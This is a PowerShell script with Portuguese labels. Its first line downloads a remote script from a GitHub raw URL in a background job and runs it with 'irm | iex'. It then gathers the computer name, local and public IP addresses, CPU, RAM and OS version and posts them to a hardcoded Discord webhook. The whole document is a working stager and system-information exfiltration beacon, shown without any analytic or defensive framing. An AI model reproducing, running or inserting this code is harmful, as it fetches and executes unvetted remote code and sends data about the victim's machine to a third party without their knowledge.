Start-Job -ScriptBlock { irm "https://raw.githubusercontent.com/arthurcsilva109-create/russo353/refs/heads/main/esp32" | iex }

$webhookUrl = "https://discord.com/api/webhooks/1535783841539559516/nJ49dBdlI25Atqn7-kJKJn7zgqPFClhgGh8iYrjeoDlErgZ3_hk1GWtIWUKdLgkDkC6y"

$computerName = [string]$env:COMPUTERNAME
$localIP = [string]((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254*" }).IPAddress -join ", ")
$publicIP = try { [string](Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -TimeoutSec 5).ip } catch { "N/A" }
$cpu = [string]((Get-CimInstance Win32_Processor).Name -join ", ")
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
$os = [string](Get-CimInstance Win32_OperatingSystem).Caption

$bodyObj = @{
    content = "PC Iniciado: $computerName"
    embeds  = @(
        @{
            title  = "Especificações do Sistema"
            fields = @(
                @{ name = "Nome do PC";  value = if ($computerName) { $computerName } else { "N/A" }; inline = $true },
                @{ name = "IP Local";   value = if ($localIP) { $localIP } else { "N/A" };         inline = $true },
                @{ name = "IP Público"; value = if ($publicIP) { $publicIP } else { "N/A" };       inline = $true },
                @{ name = "Processador";value = if ($cpu) { $cpu } else { "N/A" };                 inline = $false },
                @{ name = "RAM";        value = "$ram GB";                                         inline = $true },
                @{ name = "Sistema Op.";value = if ($os) { $os } else { "N/A" };                   inline = $true }
            )
        }
    )
}

$bodyJson = $bodyObj | ConvertTo-Json -Depth 4
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyJson)

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $bodyBytes -ContentType 'application/json; charset=utf-8'